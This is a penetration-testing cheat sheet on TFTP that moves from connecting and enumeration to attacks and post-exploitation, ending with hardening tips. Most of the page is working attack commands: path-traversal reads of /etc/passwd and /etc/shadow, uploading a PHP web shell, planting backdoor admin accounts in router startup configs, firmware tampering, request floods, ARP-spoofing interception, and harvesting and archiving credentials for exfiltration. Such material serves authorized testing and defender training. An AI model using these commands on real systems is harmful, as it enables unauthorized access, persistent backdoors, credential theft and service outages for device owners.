# TFTP

**`Default Port: 69 (UDP)`**

**Trivial File Transfer Protocol (TFTP)** is a simple, lockstep file transfer protocol that uses UDP port 69. It's designed to be simple and easy to implement, lacking the authentication and features of FTP. TFTP is commonly used for booting diskless workstations, uploading configurations to network devices, and firmware updates. Due to its lack of authentication, it can be a significant security risk when misconfigured.

### Connect <a href="#connect" id="connect"></a>

#### Using tftp Client (Linux/Unix) <a href="#using-tftp-client-linuxunix" id="using-tftp-client-linuxunix"></a>

```
# Interactive mode
tftp target.com
tftp> get filename
tftp> put localfile
tftp> quit

# Direct command
tftp target.com <<EOF
get config.cfg
quit
EOF

# Specify port (if non-standard)
tftp -p 6969 target.com
```

#### Using tftp-hpa (Enhanced TFTP client) <a href="#using-tftp-hpa-enhanced-tftp-client" id="using-tftp-hpa-enhanced-tftp-client"></a>

```
# Get file
tftp target.com -c get remotefile.txt

# Put file
tftp target.com -c put localfile.txt

# Binary mode
tftp target.com -m binary -c get firmware.bin

# ASCII mode
tftp target.com -m ascii -c get config.txt
```

#### Using atftp <a href="#using-atftp" id="using-atftp"></a>

```
# Get file with progress
atftp --get -r remotefile.txt target.com

# Put file
atftp --put -l localfile.txt target.com

# Specify timeout
atftp --option "timeout 10" --get -r file.txt target.com
```

#### Using Python <a href="#using-python" id="using-python"></a>

```
import tftpy

# Download file
client = tftpy.TftpClient('target.com', 69)
client.download('remotefile.txt', 'localfile.txt')

# Upload file
client.upload('localfile.txt', 'remotefile.txt')
```

### Recon <a href="#recon" id="recon"></a>

#### Service Detection with Nmap <a href="#service-detection-with-nmap" id="service-detection-with-nmap"></a>

Use Nmap to detect TFTP services and identify server capabilities.

```
nmap -sU -p 69 target.com
```

#### Banner Grabbing <a href="#banner-grabbing" id="banner-grabbing"></a>

Connect to TFTP services to gather version and service information.

**Using netcat**

```
# Using netcat (limited for UDP)
nc -u target.com 69

# Using tftp client
echo -e "\x00\x01test.txt\x00octet\x00" | nc -u target.com 69

# Check response
timeout 2 bash -c "echo -e '\x00\x01test\x00octet\x00' | nc -u target.com 69" | xxd
```

**Using tftp client**

```
# Try to download a common file
tftp target.com <<EOF
get test.txt
quit
EOF

# Check if write is allowed
echo "test" > test.txt
tftp target.com <<EOF
put test.txt
quit
EOF
```

### Enumeration <a href="#enumeration" id="enumeration"></a>

#### TFTP Service Assessment <a href="#tftp-service-assessment" id="tftp-service-assessment"></a>

Use specialized tools for TFTP server enumeration and vulnerability assessment.

**Using Nmap Scripts**

```
# TFTP service detection
nmap -sU -p 69 -sV target.com

# TFTP enumeration script
nmap -sU -p 69 --script tftp-enum target.com

# Version detection
nmap -sU -p 69 --script tftp-version target.com
```

**Using Metasploit**

```
use auxiliary/scanner/tftp/tftpbrute
set RHOSTS target.com
run
```

#### File Enumeration <a href="#file-enumeration" id="file-enumeration"></a>

Enumerate accessible files on TFTP servers.

**Common File Discovery**

```
# Common filenames to try
tftp target.com <<EOF
get running-config
get startup-config
get config.txt
get backup.cfg
get router-config
get switch-config
quit
EOF

# Network device configs
- running-config
- startup-config
- config.cfg
- config.txt
- configuration
- backup.cfg

# System files
- /etc/passwd
- /etc/shadow
- boot.ini
- win.ini
```

**Brute Force Filenames**

```
# Using tftpbrute (Metasploit)
use auxiliary/scanner/tftp/tftpbrute
set RHOSTS target.com
set DICTIONARY /usr/share/wordlists/tftp.txt
run

# Custom script
for file in $(cat filenames.txt); do
  echo "Trying: $file"
  timeout 2 tftp target.com <<EOF
get $file
quit
EOF
  if [ -f "$file" ]; then
    echo "[+] Found: $file"
  fi
done

# Common filename patterns
config*
*.cfg
*.conf
*.txt
*.xml
backup*
router*
switch*
*.bin
```

**Directory Traversal Attempts**

```
# Try path traversal
tftp target.com <<EOF
get ../../../etc/passwd
get ..\..\..\..\windows\win.ini
get ../../boot.ini
quit
EOF

# URL encoded
get %2e%2e%2f%2e%2e%2fetc%2fpasswd

# Double encoding
get %252e%252e%252fetc%252fpasswd
```

### Attack Vectors <a href="#attack-vectors" id="attack-vectors"></a>

Exploit various TFTP vulnerabilities and misconfigurations for unauthorized access.

#### File Download (Read Access) <a href="#file-download-read-access" id="file-download-read-access"></a>

Download sensitive files from TFTP servers.

```
# Download configuration files
tftp target.com <<EOF
get running-config running-config.txt
get startup-config startup-config.txt
get config.cfg config.txt
quit
EOF

# Download system files
tftp target.com <<EOF
get /etc/passwd passwd.txt
get /etc/shadow shadow.txt
quit
EOF

# Bulk download
for file in running-config startup-config config.cfg backup.cfg; do
  echo "[*] Trying to download: $file"
  tftp target.com <<EOF
get $file downloaded-$file
quit
EOF
done
```

#### File Upload (Write Access) <a href="#file-upload-write-access" id="file-upload-write-access"></a>

Upload malicious files to TFTP servers.

```
# Test write access
echo "test" > test.txt
tftp target.com <<EOF
put test.txt
quit
EOF

# Upload malicious configuration
cat > malicious-config.txt <<EOF
username backdoor privilege 15 secret P@ssw0rd123!
line vty 0 4
login local
transport input all
end
EOF

tftp target.com <<EOF
put malicious-config.txt running-config
quit
EOF

# Upload webshell (if TFTP root is web accessible)
cat > shell.php <<'EOF'
<?php system($_GET['cmd']); ?>
EOF

tftp target.com <<EOF
put shell.php
quit
EOF
```

#### Configuration Tampering <a href="#configuration-tampering" id="configuration-tampering"></a>

Modify network device configurations for malicious purposes.

```
# For network devices

# 1. Download current config
tftp target.com <<EOF
get running-config current-config.txt
quit
EOF

# 2. Modify config (add backdoor user)
echo "username backdoor privilege 15 secret P@ssw0rd!" >> current-config.txt

# 3. Upload modified config
tftp target.com <<EOF
put current-config.txt startup-config
quit
EOF

# 4. Device will load modified config on reboot
```

#### Firmware Manipulation <a href="#firmware-manipulation" id="firmware-manipulation"></a>

Modify device firmware for persistent backdoors.

```
# Download firmware
tftp target.com <<EOF
get firmware.bin original-firmware.bin
quit
EOF

# Analyze firmware
binwalk -e original-firmware.bin

# Modify firmware (add backdoor)
# This requires reverse engineering skills

# Upload modified firmware
tftp target.com <<EOF
put modified-firmware.bin firmware.bin
quit
EOF
```

#### Denial of Service <a href="#denial-of-service" id="denial-of-service"></a>

Perform denial of service attacks against TFTP servers.

```
# Overwrite critical files
echo "" > empty.txt
tftp target.com <<EOF
put empty.txt config.cfg
put empty.txt running-config
put empty.txt startup-config
quit
EOF

# Upload large file to exhaust storage
dd if=/dev/zero of=largefile.bin bs=1M count=1000
tftp target.com <<EOF
put largefile.bin
quit
EOF

# Flood with requests
for i in {1..1000}; do
  echo "get config.cfg" | tftp target.com &
done
```

#### Man-in-the-Middle <a href="#man-in-the-middle" id="man-in-the-middle"></a>

Intercept and modify TFTP traffic for malicious purposes.

```
# Since TFTP has no authentication
# Easy to intercept and modify traffic

# Using Ettercap
ettercap -T -M arp:remote /target-ip// /tftp-server//

# Modify TFTP responses in transit
# Requires packet manipulation

# Using Scapy
python3 << 'EOF'
from scapy.all import *

def tftp_mitm(pkt):
    if pkt.haslayer(TFTP):
        # Intercept and modify TFTP packets
        print(f"Intercepted TFTP packet: {pkt.summary()}")
        # Modify packet here
        send(modified_packet)

sniff(filter="udp port 69", prn=tftp_mitm)
EOF
```

### Post-Exploitation <a href="#post-exploitation" id="post-exploitation"></a>

Extract sensitive data and establish persistent access after successful TFTP exploitation.

#### Credential Extraction <a href="#credential-extraction" id="credential-extraction"></a>

Extract credentials and authentication data from downloaded configuration files.

```
# From downloaded configs
grep -i "password\|secret\|username" downloaded-configs/*

# Cisco configs
grep "username\|secret\|password\|enable" config.txt

# Decode Cisco type 7 passwords
# Use online decoder or tool
cisco-decrypt "060506324F41"

# Juniper configs
grep "encrypted-password\|ssh-rsa" config.txt

# Extract SNMP community strings
grep "snmp-server community" config.txt
```

#### Network Mapping <a href="#network-mapping" id="network-mapping"></a>

Use extracted configuration data to map network topology.

```
# From configuration files
# Extract network information

# IP addresses
grep -E "([0-9]{1,3}\.){3}[0-9]{1,3}" config.txt

# Subnets
grep -E "network\|subnet\|route" config.txt

# VLANs
grep -i "vlan" config.txt

# Access lists
grep -A 10 "access-list" config.txt
```

#### Privilege Escalation <a href="#privilege-escalation" id="privilege-escalation"></a>

Escalate privileges on network devices using configuration manipulation.

```
# If you can upload configs to network devices

# Create config with privileged user
cat > privesc-config.txt <<EOF
username admin privilege 15 secret SuperSecretP@ss!
enable secret EnableP@ss123!
line vty 0 4
 login local
 transport input all
end
EOF

# Upload to startup-config
tftp target.com <<EOF
put privesc-config.txt startup-config
quit
EOF

# Wait for device reboot or force reboot if you have access
```

#### Persistence <a href="#persistence" id="persistence"></a>

Create persistent backdoor access to compromised systems.

```
# Add backdoor to startup configuration
cat > backdoor-config.txt <<EOF
username backdoor privilege 15 secret BackdoorP@ss123!
ip ssh version 2
line vty 0 4
 login local
 transport input ssh
EOF

tftp target.com <<EOF
put backdoor-config.txt startup-config
quit
EOF

# Backdoor survives reboots
```

#### Lateral Movement <a href="#lateral-movement" id="lateral-movement"></a>

Use extracted credentials for lateral movement across the network.

```
# Use obtained credentials for other devices
# From extracted configs

# SSH to other devices
ssh admin@192.168.1.1

# Telnet to other devices
telnet 192.168.1.2

# Access management interfaces
# Use extracted SNMP community strings
snmpwalk -v2c -c private 192.168.1.3
```

#### Data Exfiltration <a href="#data-exfiltration" id="data-exfiltration"></a>

Extract and exfiltrate sensitive data from compromised systems.

```
# Extract all configuration files
for config in $(ls *.txt *.cfg *.conf); do
  echo "[+] Extracting data from: $config"
  grep -i "password\|secret\|key\|token" "$config" >> extracted_credentials.txt
  grep -E "([0-9]{1,3}\.){3}[0-9]{1,3}" "$config" >> network_ips.txt
done

# Compress and exfiltrate
tar -czf tftp_data.tar.gz *.txt *.cfg *.conf
# Upload to attacker server or transfer via other means
```

### TFTP Packet Structure <a href="#tftp-packet-structure" id="tftp-packet-structure"></a>

```
Opcode   Operation
1        Read request (RRQ)
2        Write request (WRQ)
3        Data (DATA)
4        Acknowledgment (ACK)
5        Error (ERROR)

   2 bytes     string    1 byte     string   1 byte
   -----------------------------------------------
  | Opcode |  Filename  |   0  |    Mode    |   0  |
   -----------------------------------------------

\x00\x01  - RRQ (Read Request)
\x00\x02  - WRQ (Write Request)
\x00\x03  - DATA
\x00\x04  - ACK
\x00\x05  - ERROR
```

### Common TFTP Files to Look For <a href="#common-tftp-files-to-look-for" id="common-tftp-files-to-look-for"></a>

| File             | Description           | Device Type     |
| ---------------- | --------------------- | --------------- |
| `running-config` | Current configuration | Cisco devices   |
| `startup-config` | Boot configuration    | Cisco devices   |
| `config.cfg`     | Configuration file    | Generic         |
| `backup.cfg`     | Backup configuration  | Generic         |
| `firmware.bin`   | Firmware image        | Various devices |
| `/etc/passwd`    | User accounts         | Linux systems   |
| `/etc/shadow`    | Password hashes       | Linux systems   |
| `boot.ini`       | Boot configuration    | Windows         |
| `win.ini`        | Windows config        | Windows         |

### TFTP Error Codes <a href="#tftp-error-codes" id="tftp-error-codes"></a>

| Code | Message                | Meaning                      |
| ---- | ---------------------- | ---------------------------- |
| 0    | Not defined            | Varies                       |
| 1    | File not found         | Requested file doesn't exist |
| 2    | Access violation       | Permission denied            |
| 3    | Disk full              | No space left                |
| 4    | Illegal TFTP operation | Invalid request              |
| 5    | Unknown transfer ID    | Wrong port                   |
| 6    | File already exists    | Can't overwrite              |
| 7    | No such user           | Authentication failed        |

### Useful Tools <a href="#useful-tools" id="useful-tools"></a>

| Tool       | Description            | Primary Use Case      |
| ---------- | ---------------------- | --------------------- |
| tftp       | Standard TFTP client   | File transfer         |
| atftp      | Advanced TFTP client   | Enhanced features     |
| tftp-hpa   | High-performance TFTP  | Fast transfers        |
| tftpy      | Python TFTP library    | Scripting             |
| Nmap       | Network scanner        | Service detection     |
| Metasploit | Exploitation framework | Automated enumeration |
| Wireshark  | Packet analyzer        | Traffic analysis      |

### Security Misconfigurations to Test <a href="#security-misconfigurations-to-test" id="security-misconfigurations-to-test"></a>

* ❌ No authentication required
* ❌ Write access enabled
* ❌ Exposed to internet
* ❌ Accessible from untrusted networks
* ❌ Serving sensitive files
* ❌ No file access restrictions
* ❌ Root directory misconfigured
* ❌ No logging enabled
* ❌ Running with excessive permissions
* ❌ No encryption (TFTP is always unencrypted)
* ❌ Default configuration unchanged
* ❌ Used for permanent file storage

### TFTP Security Best Practices <a href="#tftp-security-best-practices" id="tftp-security-best-practices"></a>

* ✅ Restrict TFTP to trusted networks only
* ✅ Use TFTP only when necessary
* ✅ Implement firewall rules
* ✅ Use read-only mode when possible
* ✅ Configure proper file permissions
* ✅ Use secure alternatives (SFTP, SCP)
* ✅ Enable logging and monitoring
* ✅ Limit accessible file paths
* ✅ Regular security audits
* ✅ Use VPN for remote TFTP access
* ✅ Implement network segmentation
* ✅ Replace with more secure protocols

### TFTP vs Secure Alternatives <a href="#tftp-vs-secure-alternatives" id="tftp-vs-secure-alternatives"></a>

| Protocol | Port | Auth | Encryption | Use Case                 |
| -------- | ---- | ---- | ---------- | ------------------------ |
| TFTP     | 69   | No   | No         | Legacy devices, PXE boot |
| FTP      | 21   | Yes  | No         | General file transfer    |
| SFTP     | 22   | Yes  | Yes        | Secure file transfer     |
| FTPS     | 990  | Yes  | Yes        | Secure FTP               |
| SCP      | 22   | Yes  | Yes        | Secure copy              |
